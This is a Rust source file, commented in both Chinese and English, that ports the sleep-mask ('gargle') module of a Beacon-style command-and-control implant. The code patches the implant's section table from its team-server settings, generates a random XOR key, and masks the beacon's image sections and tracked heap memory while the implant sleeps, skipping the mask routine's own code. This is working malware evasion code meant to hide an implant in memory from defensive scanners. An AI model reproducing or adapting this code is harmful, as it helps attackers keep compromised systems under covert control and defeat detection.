//! gargleint.cpp 的移植版 — 共享的 gargle（睡眠掩码）参数块和
//! Port of gargleint.cpp — the shared gargle (sleep mask) parameter block and
//! trampoline 设置。
//! trampoline setup.
//!
//! C++ 构建将原始 asm trampoline（`_gargle_it`）复制到可执行
//! The C++ build copies a raw asm trampoline (`_gargle_it`) into an executable
//! 堆区域，将其地址记录在 `gtrampoline` 中，分配一个 `GARGLEP`
//! heap region, records its address in `gtrampoline`, allocates a `GARGLEP`
//! 参数块（`gparms`），并填充团队服务器在
//! parameter block (`gparms`) and fills the `-1` placeholders that the team
//! `SETTING_GARGLE_SECTIONS` 表中留下的 `-1` 占位符为 trampoline 的
//! server left in the `SETTING_GARGLE_SECTIONS` table with the trampoline's
//! 起始/结束偏移，使掩码循环永远不会掩码自身代码。
//! begin/end offsets so the mask loop never masks its own code.
//!
//! Rust 移植版做相同的*数据*工作，但从不执行复制的
//! The Rust port does the same *data* work but never executes a copied
//! trampoline：`gargle_trampoline` 记录（Rust）掩码函数的地址
//! trampoline: `gargle_trampoline` records the (Rust) mask function addresses
//! 并像 C++ 一样修补段表，掩码本身
//! and patches the section table exactly like the C++, and the masking itself
//! 是对相同内存范围应用的普通 XOR（参见
//! is a plain XOR applied to the same memory ranges (see
//! [`mask_sections_and_heap`]）。`-1` 占位符变成*反转*的对
//! [`mask_sections_and_heap`]). The `-1` placeholders become a *reversed* pair
//! `(end, begin)`；[`mask_sections_and_heap`] 跳过反转对，这就是
//! `(end, begin)`; [`mask_sections_and_heap`] skips reversed pairs, which is
//! trampoline 区域保持不被掩码的方式。
//! how the trampoline region stays untouched.

use crate::track_memory::{track_memory_add, HeapRecord, TRACK_MEMORY_MALLOC};
use parking_lot::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::OnceLock;

/// XOR 掩码的大小（gargleint.h `MASK_SIZE`）。
/// Size of the XOR mask (gargleint.h `MASK_SIZE`).
pub const MASK_SIZE: usize = 13;

/// GARGLEP — gargle 参数块（gargleint.h）。
/// GARGLEP — the gargle parameter block (gargleint.h).
///
/// `sections` 指向（修补后的）`SETTING_GARGLE_SECTIONS` DWORD 数组：
/// `sections` points at the (patched) `SETTING_GARGLE_SECTIONS` DWORD array:
/// `[begin, end]` 偏移对，相对于 `beacon_ptr`，以 `(0, 0)` 结尾。
/// `[begin, end]` pairs of offsets relative to `beacon_ptr`, terminated by
/// `(0, 0)` 之后，`heap_records` 镜像 C++ 指针（当前要掩码的堆记录）；
/// `(0, 0)`. `heap_records` mirrors the C++ pointer (the current heap records
/// 记录本身保存在 [`CURRENT_HEAP`] 中。
/// to mask); the records themselves live in [`CURRENT_HEAP`].
#[repr(C)]
pub struct GargleP {
    /// 指向我们的基础 Beacon 段（映像基址）的指针。
    /// Pointer to our base Beacon section (image base).
    pub beacon_ptr: *mut u8,
    /// 我们要掩码的段（相对于 `beacon_ptr` 的偏移）。
    /// The sections we want to mask (offsets from `beacon_ptr`).
    pub sections: *mut u8,
    /// 我们要掩码的堆内存（镜像 C++ 的 `HEAP_RECORD` 列表）。
    /// The heap memory we want to mask (mirrors the C++ `HEAP_RECORD` list).
    pub heap_records: *mut u8,
    /// 我们要应用的掩码。
    /// The mask we want to apply.
    pub mask: [u8; MASK_SIZE],
}

// 这些指针是稳定的进程全局地址（映像基址、修补后的设置 blob、
// The pointers are stable process-global addresses (image base, patched
// 堆记录列表）；互斥锁使访问串行化，因此该结构可以安全共享。
// settings blob, heap-record list); the mutex serializes access, so the
// 镜像 C++ 的全局 `gparms`。
// struct is safe to share. Mirrors the C++ global `gparms`.
unsafe impl Send for GargleP {}

impl GargleP {
    const fn empty() -> GargleP {
        GargleP {
            beacon_ptr: std::ptr::null_mut(),
            sections: std::ptr::null_mut(),
            heap_records: std::ptr::null_mut(),
            mask: [0u8; MASK_SIZE],
        }
    }
}

/// `gtrampoline` — 睡眠掩码函数的地址，设置前为 0。
/// `gtrampoline` — address of the sleep mask function, or 0 before setup.
pub static GTRAMPOLINE: AtomicUsize = AtomicUsize::new(0);

/// `gparms` — 进程生命周期的 gargle 参数块。C++ 只 malloc 一次
/// `gparms` — the process-lifetime gargle parameter block. The C++ mallocs it
/// 且从不释放；`parking_lot::Mutex<GargleP>` 静态变量是 Rust 的
/// once and never frees it; a `parking_lot::Mutex<GargleP>` static is the Rust
/// 等效方案（地址稳定、无分配、无泄漏）。
/// equivalent (stable address, no allocation, no leak).
static GPARMS: Mutex<GargleP> = Mutex::new(GargleP::empty());

/// `SETTING_GARGLE_SECTIONS` blob 的修补副本（参见 [`gargle_trampoline`]）。
/// Patched copy of the `SETTING_GARGLE_SECTIONS` blob (see [`gargle_trampoline`]).
/// 在整个进程生命周期内保存，使 `sections` 保持有效，镜像
/// Stored for the process lifetime so `sections` stays valid, mirroring the
/// C++ 对 myargs blob 的就地修补。
/// C++ in-place patch of the myargs blob.
static SECTION_BLOB: OnceLock<Vec<u8>> = OnceLock::new();

/// 当前要掩码的堆记录，在每次睡眠/等待前刷新，以便覆盖新的
/// The current heap records to mask, refreshed before every sleep/wait so new
/// 分配（C++ 通过 `track_memory_get_heap_records_to_mask` 在每次
/// allocations are covered (the C++ resets `gparms->heap_records` for each
/// 睡眠时重置 `gparms->heap_records`）。
/// sleep via `track_memory_get_heap_records_to_mask`).
static CURRENT_HEAP: Mutex<Vec<HeapRecord>> = Mutex::new(Vec::new());

/// 对全局 gargle 参数块的加锁访问。
/// Locked access to the global gargle parameter block.
pub fn gparms() -> parking_lot::MutexGuard<'static, GargleP> {
    GPARMS.lock()
}

/// 刷新 gargle 掩码的堆记录。在每次掩码睡眠/等待前调用，
/// Refresh the heap records that gargle masks. Called before every masked
/// 以便覆盖上次睡眠后新增的条目。镜像
/// sleep/wait so items added since the last sleep are covered. Mirrors
/// `gparms->heap_records = track_memory_get_heap_records_to_mask()`。
/// `gparms->heap_records = track_memory_get_heap_records_to_mask()`.
pub fn refresh_heap_records() {
    let recs = crate::track_memory::track_memory_get_heap_records_to_mask();
    let ptr;
    {
        let mut current = CURRENT_HEAP.lock();
        *current = recs;
        ptr = if current.is_empty() {
            std::ptr::null_mut()
        } else {
            current.as_ptr() as *mut u8
        };
    }
    /* 获取 GPARMS 时绝不要持有 CURRENT_HEAP（掩码按相反顺序获取锁） */
    /* never hold CURRENT_HEAP while taking GPARMS (masking takes the reverse order) */
    GPARMS.lock().heap_records = ptr;
}

/// `gargle_trampoline` — 设置 trampoline 和 gargle 参数块。
/// `gargle_trampoline` — set up the trampoline and the gargle parameter block.
///
/// gargleint.cpp 的忠实移植：
/// Faithful port of gargleint.cpp:
/// 1. 如果 trampoline 已经设置过则立即返回。
/// 1. Returns immediately if the trampoline was already set up.
/// 2. 将 `begin` 记录为 trampoline 地址。
/// 2. Records `begin` as the trampoline address.
/// 3. 分配 `GARGLEP`，跟踪它（mask = FALSE），并填充
/// 3. Allocates the `GARGLEP`, tracks it (mask = FALSE), and fills
///    `beacon_ptr` / `sections` / `heap_records`。
///    `beacon_ptr` / `sections` / `heap_records`.
/// 4. 用 trampoline 的结束/开始偏移（相对于 `beacon_ptr`）
/// 4. Replaces the `-1` placeholders in the sections table with the
///    替换段表中的 `-1` 占位符。
///    trampoline end/begin offsets (relative to `beacon_ptr`).
/// 5. 填充随机掩码（`rng_get_bytes` → `getrandom`）。
/// 5. Fills the random mask (`rng_get_bytes` → `getrandom`).
///
/// 在 C++ 构建中，trampoline 字节被复制到堆区域并执行；在 Rust 移植版
/// In the C++ build the trampoline bytes were copied and executed from a heap
/// 中，掩码函数是普通的 Rust 代码，只记录其*地址*（用于占位符偏移）。
/// region; in the Rust port the mask function is ordinary Rust code and only
/// its *address* is recorded (used for the placeholder offsets).
pub fn gargle_trampoline(end: *mut u8, begin: *mut u8) {
    if GTRAMPOLINE.load(Ordering::SeqCst) != 0 {
        return;
    }

    /* 计算我们函数的大小 */
    /* calculate the size of our function */
    let _dw_function_size = (end as usize).wrapping_sub(begin as usize);

    /* 将 trampoline 设置为睡眠掩码函数的起始位置 */
    /* set trampoline to the start of the sleep mask function */
    GTRAMPOLINE.store(begin as usize, Ordering::SeqCst);

    /* 设置我们的参数 */
    /* setup our parameters, please */
    let mut gp = GargleP {
        beacon_ptr: crate::settings::get_beacon_ptr() as *mut u8,
        sections: std::ptr::null_mut(),
        /* 每次睡眠都会重置。 */
        heap_records: std::ptr::null_mut(), /* this is reset for each sleep. */
        mask: [0u8; MASK_SIZE],
    };

    /* 更新段中的占位符地址，使睡眠掩码函数不会被掩码。
     * C++ 就地修补 myargs blob；我们改为修补进程生命周期的副本
     * （数据相同，不会通过不可变的设置切片产生别名）。 */
    /* update place holder addresses in the sections, so the sleep mask
     * function will not be masked. The C++ patches the myargs blob in place;
     * we patch a process-lifetime copy instead (same data, no aliasing
     * through an immutable setting slice). */
    if let Some(sections) = crate::settings::setting_ptr(crate::beacon::SETTING_GARGLE_SECTIONS) {
        let mut blob = sections.to_vec();
        patch_placeholders(&mut blob, end, begin, gp.beacon_ptr as usize);
        let ptr = blob.as_ptr() as *mut u8;
        let _ = SECTION_BLOB.set(blob);
        gp.sections = ptr;
    }

    /* 随机掩码：rng_get_bytes(mask, sizeof(mask), NULL) */
    /* random mask: rng_get_bytes(mask, sizeof(mask), NULL) */
    let _ = getrandom::fill(&mut gp.mask);

    /* 像 C++ 的 malloc + track_memory_add 一样跟踪参数块 */
    /* track the parameter block exactly like the C++ malloc + track_memory_add */
    let gp_addr = std::ptr::addr_of!(*GPARMS.lock()) as usize;
    track_memory_add(
        gp_addr,
        std::mem::size_of::<GargleP>(),
        TRACK_MEMORY_MALLOC,
        false,
        None,
    );

    *GPARMS.lock() = gp;
}

/// 替换段 DWORD 数组中的 `-1`（`0xFFFFFFFF`）占位符。
/// Replace `-1` (`0xFFFFFFFF`) placeholders in the sections DWORD array.
///
/// 依据 gargleint.cpp：一对中的第一个槽位被替换为 trampoline 的*结束*
/// Per gargleint.cpp: the first slot of a pair is replaced with the trampoline
/// 偏移，第二个被替换为 trampoline 的*开始*偏移。该对随后读作
/// *end* offset, the second with the trampoline *begin* offset. The pair then
/// `(end, begin)` — 与真正的 `(begin, end)` 区间相比是反转的，
/// reads as `(end, begin)` — reversed relative to a real `(begin, end)` range,
/// [`mask_sections_and_heap`] 正是以此识别并跳过它。
/// which is how [`mask_sections_and_heap`] recognises and skips it.
fn patch_placeholders(sections: &mut [u8], end: *mut u8, begin: *mut u8, beacon_ptr: usize) {
    let words = sections.len() / 4;
    if words < 2 {
        return;
    }
    let dwords: &mut [u32] =
        unsafe { std::slice::from_raw_parts_mut(sections.as_mut_ptr() as *mut u32, words) };
    let mut index = 0usize;
    while index + 1 < words {
        let a = dwords[index];
        let b = dwords[index + 1];
        if a == 0 && b == 0 {
            break;
        }
        if a == u32::MAX {
            /* 用睡眠掩码函数的结束位置替换此处 */
            /* Replace this with the sleep mask function end location */
            dwords[index] = (end as usize).wrapping_sub(beacon_ptr) as u32;
        }
        if b == u32::MAX {
            /* 用睡眠掩码函数的开始位置替换此处 */
            /* Replace this with the sleep mask function begin location */
            dwords[index + 1] = (begin as usize).wrapping_sub(beacon_ptr) as u32;
        }
        /* 跳到下一个段 */
        index += 2; /* goto the next section */
    }
}

/// 用 13 字节掩码对 `ptr` 处的 `len` 字节进行 XOR，每次处理一个 DWORD。
/// XOR `len` bytes at `ptr` with the 13-byte mask, DWORD at a time.
///
/// 忠实于 C++ 的 `((DWORD *)addr)[i] ^= mask[i % sizeof(mask)]`，其中
/// Faithful to the C++ `((DWORD *)addr)[i] ^= mask[i % sizeof(mask)]` where
/// `mask` 是有符号 `char`：每个 DWORD 与符号扩展的掩码字节 XOR，
/// `mask` is a signed `char`: each DWORD is XORed with the sign-extended mask
/// 因此掩码值 < 0x80 时只有低字节变化，值 >= 0x80 时四个字节都变化。
/// byte, so only the low byte changes for mask values < 0x80 and all four
/// XOR 是自身的逆运算，因此对同一掩码应用两次即可还原原始字节。
/// bytes change for values >= 0x80. XOR is its own inverse, so applying the
/// same mask twice restores the original bytes.
///
/// # 安全性
/// # Safety
/// `ptr` 必须指向 `len` 个可按 `u32` 对齐读写的字节
/// `ptr` must point to `len` readable/writable bytes aligned for `u32`
/// （段偏移是 DWORD 对齐的；堆记录来自分配器）。
/// (section offsets are DWORD-aligned; heap records come from the allocator).
pub(crate) unsafe fn mask_region(ptr: *mut u8, len: usize, mask: &[u8; MASK_SIZE]) {
    if ptr.is_null() {
        return;
    }
    let words = len / 4;
    for i in 0..words {
        let d = ptr.add(i * 4) as *mut u32;
        *d ^= (mask[i % MASK_SIZE] as i8) as u32;
    }
}

/// 掩码被跟踪的堆记录和配置的信标段。
/// Mask the tracked heap records and the configured beacon sections.
///
/// 镜像 C++ `_gargle_it` 循环的掩码部分：
/// Mirrors the masking half of the C++ `_gargle_it` loop:
/// - 堆：来自 `track_memory_get_heap_records_to_mask()` 的每条记录
/// - heap: every record from `track_memory_get_heap_records_to_mask()`
/// - 段：从 `beacon_ptr` 出发的 `[begin, end]` 偏移对；反转对
/// - sections: `[begin, end]` pairs of offsets from `beacon_ptr`; reversed
///   （trampoline 区域，由 [`gargle_trampoline`] 编码为 `(end, begin)`）
///   pairs (the trampoline region, encoded as `(end, begin)` by
///   会被跳过，因此掩码函数永远不会被掩码。
///   [`gargle_trampoline`]) are skipped so the mask function is never masked.
pub(crate) fn mask_sections_and_heap(parms: &GargleP) {
    /* 掩码我们的堆段 */
    /* mask our heap sections */
    let recs = CURRENT_HEAP.lock();
    for rec in recs.iter() {
        if rec.size == 0 {
            continue;
        }
        unsafe { mask_region(rec.ptr as *mut u8, rec.size, &parms.mask) };
    }
    drop(recs);

    /* 掩码我们的段 */
    /* mask our sections */
    if parms.sections.is_null() {
        return;
    }
    let sections = parms.sections as *const u32;
    let mut index = 0usize;
    loop {
        let a = unsafe { *sections.add(index) };
        let b = unsafe { *sections.add(index + 1) };
        if a == 0 && b == 0 {
            break;
        }
        /* 跳过反转的（trampoline）区间 */
        /* skip reversed (trampoline) ranges */
        if a < b {
            let base = parms.beacon_ptr as usize;
            unsafe { mask_region((base + a as usize) as *mut u8, (b - a) as usize, &parms.mask) };
        }
        index += 2;
    }
}

/// 取消掩码被跟踪的堆记录和信标段。
/// Unmask the tracked heap records and beacon sections.
///
/// C++ 在 100 ms 分片中开关掩码；由于 XOR 是自身的逆运算，
/// The C++ toggles the mask on and off in 100 ms slices; since XOR is its own
/// 取消掩码就是第二次应用相同的 XOR。
/// inverse, unmasking applies the same XOR a second time.
pub(crate) fn unmask_sections_and_heap(parms: &GargleP) {
    mask_sections_and_heap(parms);
}
